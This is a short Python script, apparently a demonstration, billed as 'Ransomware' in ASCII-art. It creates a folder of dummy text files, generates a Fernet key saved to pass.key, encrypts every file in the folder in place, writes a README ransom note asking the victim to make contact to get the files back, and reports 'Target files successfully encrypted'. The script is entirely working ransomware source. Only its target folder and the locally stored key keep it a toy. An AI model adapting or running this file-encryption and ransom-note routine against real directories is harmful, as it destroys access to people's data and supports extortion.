from art import *
from termcolor import colored
import os
from cryptography.fernet import Fernet
from typing import List

print(colored(text2art("Ransomware").center(60), 'cyan'))


def create_dir(directory: str) -> str:
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory


def fill_directory(directory: str) -> None:
    for i in range(5):
        with open(f'{directory}/file{i}.txt', 'w') as file:
            file.write(f"Random content {i}..")


def key_generation() -> None:
    generated_key = Fernet.generate_key()
    with open("pass.key", "wb") as key_file:
        key_file.write(generated_key)


def read_key() -> bytes:
    return open("pass.key", "rb").read()


def encrypt_files(items: List[str], generated_key: bytes) -> None:
    fernet = Fernet(generated_key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)


pwd = create_dir('files')
fill_directory(pwd)
files = os.listdir(pwd)
file_paths = [f'{pwd}/{item}' for item in files]
key_generation()
key = read_key()
encrypt_files(file_paths, key)
with open(f"{pwd}/README.txt", 'w') as info_file:
    info_file.write("Reach out at ****** to get your files back...")
print("Target files successfully encrypted....")
